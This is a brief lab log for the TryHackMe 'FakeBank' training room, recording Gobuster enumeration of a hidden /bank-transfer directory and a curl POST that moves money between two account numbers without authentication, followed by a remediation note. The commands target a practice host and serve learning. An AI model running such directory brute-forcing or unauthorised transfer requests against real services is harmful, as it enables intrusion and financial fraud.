# Day 1 — FakeBank (TryHackMe)
**Date:** YYYY-MM-DD

## Summary
Used Gobuster to find hidden directory `/bank-transfer` and performed a transfer from account **2276** to **8881**.

## Commands run
- `gobuster -u http://fakebank.thm -w wordlist.txt dir`
- `curl -X POST -d "from=2276&to=8881&amount=2000" http://fakebank.thm/bank-transfer`

## Artifacts
- `fakebank_flag.png` (screenshot) — upload this file next
- `fakebank_commands.txt` (terminal output)

## Notes / Remediation
- The transfer endpoint lacked authentication/validation. Recommend server-side auth and input validation.
